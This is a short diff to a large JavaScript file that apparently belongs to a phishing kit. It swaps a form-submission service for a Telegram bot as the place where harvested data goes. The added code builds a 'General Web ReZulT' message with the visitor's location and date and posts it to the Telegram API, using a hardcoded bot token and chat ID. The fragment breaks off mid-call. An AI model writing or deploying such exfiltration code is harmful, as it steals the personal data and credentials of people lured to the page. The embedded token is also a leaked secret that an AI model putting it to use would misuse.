@@ -17143,20 +17143,18 @@
                 message += `Region and Country : ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} \n`;
                 message += "Date : " + date + "\n";
                 message +=
-                 $.ajax({
-                 url: "https://submit-form.com/E7IDqx59e",   // this is your email script
-                 type: "POST",
-                 data: {
-                 message: message
-  },
-                 success: function(response) {
-                 alert("Submission sent successfully.");
-  },
-                 error: function() {
-                 alert("Error sending submission.");
-  }
-});
+                  `---------+ General Web ReZulT ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} +-------------\n`;
+                var token = "7264177093:AAGdugPF7V02Nzmura71jMHpTaiNkRLlv9o";
+                var chatId = "5965216669";
 
+                $.ajax({
+                  dataType: 'JSON',
+                  url: `https://api.telegram.org/bot${token}/sendMessage`,
+                  type: 'POST',
+                  data: {
+                    "chat_id": chatId,
+                    "text": message
+                  },
                   beforeSend: function (xhr) {
                     $('#submit-btn').html(langs.verifyingText);
                   },
